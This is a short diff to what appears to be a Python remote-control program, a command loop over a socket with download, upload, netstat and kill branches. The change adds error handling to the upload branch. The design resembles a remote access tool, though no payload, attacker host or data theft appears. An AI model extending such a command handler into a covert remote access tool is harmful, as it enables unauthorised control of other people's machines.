@@ -25,7 +25,9 @@ def run(host, port):
             elif command[:8] == "download":
                 pass
             elif command[:6] == "upload":
-                upload(client_socket, command[7:])
+                uploaded_data = upload(client_socket, command[7:])
+                if uploaded_data.startswith("[!] Error"):
+                    continue
             elif command == "netstat":
                 pass
             elif command[:4] == "kill":
